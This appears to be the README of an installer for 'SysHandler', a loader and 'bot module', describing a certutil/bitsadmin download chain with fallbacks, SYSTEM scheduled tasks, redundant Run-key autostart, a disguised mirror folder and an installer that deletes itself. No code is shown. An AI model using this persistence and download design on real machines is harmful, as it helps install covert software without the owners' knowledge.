SysHandler version-X
====================

WHAT IS IN THIS PACKAGE
  install.bat      One-file installer. Downloads the current SysHandler
                   binaries directly from GitHub and sets everything up.
  uninstall.bat    Complete removal of SysHandler from the computer.
  SysHandler.exe   Reference copy of the current loader.
  SysHandler.dll   Reference copy of the current bot module.
  README.txt       This file.

HOW TO INSTALL (Windows 10 and Windows 11)
  1. Right-click install.bat and choose "Run as administrator".
  2. The installer downloads the package from GitHub using, in order:
       curl.exe -> PowerShell Invoke-WebRequest -> Start-BitsTransfer
       -> bitsadmin -> certutil
     All five tools are built into Windows 10 (1803+) and Windows 11,
     so no extra software is needed.
  3. When you see "Everything is perfect." the installation is complete.
  4. If a download attempt fails, the installer automatically retries with
     the next method and then repeats the whole chain once. If GitHub is
     unreachable you will see "Unable to download required files from
     GitHub." - check the internet connection and run install.bat again.
     A technical log is kept in the temp folder shown on screen.

WHAT THE INSTALLER SETS UP
  - Copies SysHandler.exe and SysHandler.dll into
      C:\ProgramData\SysHandler   (main)
      C:\ProgramData\SvcCache     (mirror)
  - Creates the scheduled tasks "SysHandler Watchdog" (at system start)
    and "SysHandler Fallback" (at logon), both running as SYSTEM.
  - Registers autostart in HKCU and HKLM Run keys.
  - Writes the installation fingerprint under HKLM\SOFTWARE\SysHandler.
  - Starts SysHandler.
  - Deletes the temporary download folder.
  - Deletes the installer script itself 3 seconds after a successful
    installation. The installer is kept if the installation fails.
  - If an older version is found, the installer reports
    "UPDATE DETECTED" followed by "UPGRADE COMPLETE".

HOW TO UNINSTALL
  1. Right-click uninstall.bat and choose "Run as administrator".
  2. This stops SysHandler, removes both scheduled tasks, both Run keys,
     the fingerprint key and both program folders.

SUPPORTED SYSTEMS
  Windows 10 (version 1803 or newer) and Windows 11, 64-bit.
